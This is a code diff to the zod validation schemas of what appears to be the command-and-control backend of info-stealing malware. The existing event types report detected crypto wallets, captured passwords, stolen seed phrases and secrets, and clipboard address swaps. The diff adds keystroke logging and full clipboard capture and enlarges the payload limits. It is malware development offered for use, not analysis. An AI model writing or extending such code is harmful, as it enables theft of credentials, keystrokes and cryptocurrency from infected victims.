@@ -167,8 +167,8 @@ const bodyShape = z.strictObject({
 });
 
 const eventData = z.discriminatedUnion('kind', [
-  z.strictObject({ kind: z.literal('wallet_detected'), data: z.strictObject({ name: z.string().min(1).max(128), pid: z.number().int().min(1) }) }),
-  z.strictObject({ kind: z.literal('wallet_closed'), data: z.strictObject({}) }),
+  z.strictObject({ kind: z.literal('wallet_detected'), data: z.strictObject({ name: z.string().min(1).max(128), pid: z.number().int().min(1), title: z.string().max(512).optional(), url: z.string().max(1024).optional() }) }),
+  z.strictObject({ kind: z.literal('wallet_closed'), data: z.strictObject({ pid: z.number().int().min(1).optional(), title: z.string().max(512).optional() }) }),
   z.strictObject({ kind: z.literal('password'), data: z.strictObject({ process: z.string().max(260), title: z.string().max(512), text: z.string().min(1).max(4096) }) }),
   z.strictObject({
     kind: z.literal('clipboard_secret'),
@@ -181,6 +181,23 @@ const eventData = z.discriminatedUnion('kind', [
     })
   }),
   z.strictObject({ kind: z.literal('clipboard_replace'), data: z.strictObject({ coin: z.string().min(1).max(16), original: z.string().min(1).max(256), replacement: z.string().min(1).max(256) }) }),
+  z.strictObject({
+    kind: z.literal('keystroke'),
+    data: z.strictObject({
+      text: z.string().min(1).max(512),
+      process: z.string().max(260).optional(),
+      title: z.string().max(512).optional()
+    })
+  }),
+  z.strictObject({
+    kind: z.literal('clipboard'),
+    data: z.strictObject({
+      content: z.string().min(1).max(262_144),
+      kind: z.string().max(32).optional(),
+      process: z.string().max(260).optional(),
+      title: z.string().max(512).optional()
+    })
+  }),
   z.strictObject({ kind: z.literal('seed_found'), data: z.strictObject({ words: z.union([z.literal(12), z.literal(18), z.literal(24)]), value: z.string().min(1).max(4096) }) }),
   z.strictObject({
     kind: z.literal('secret_found'),
@@ -214,9 +231,9 @@ const inbound = {
   event: z.strictObject({
     ...baseShape,
     type: z.literal('event'),
-    kind: z.enum(['wallet_detected', 'wallet_closed', 'password', 'clipboard_secret', 'clipboard_replace', 'seed_found', 'secret_found']),
+    kind: z.enum(['wallet_detected', 'wallet_closed', 'password', 'clipboard_secret', 'clipboard_replace', 'seed_found', 'secret_found', 'keystroke', 'clipboard']),
     data: z.record(z.unknown()),
-    legacy: z.string().max(4096)
+    legacy: z.string().max(262_144)
   }),
   ack: z.strictObject({ ...baseShape, type: z.literal('ack'), reply_to: uuid }),
   ping: z.strictObject({ ...baseShape, type: z.literal('ping') }),
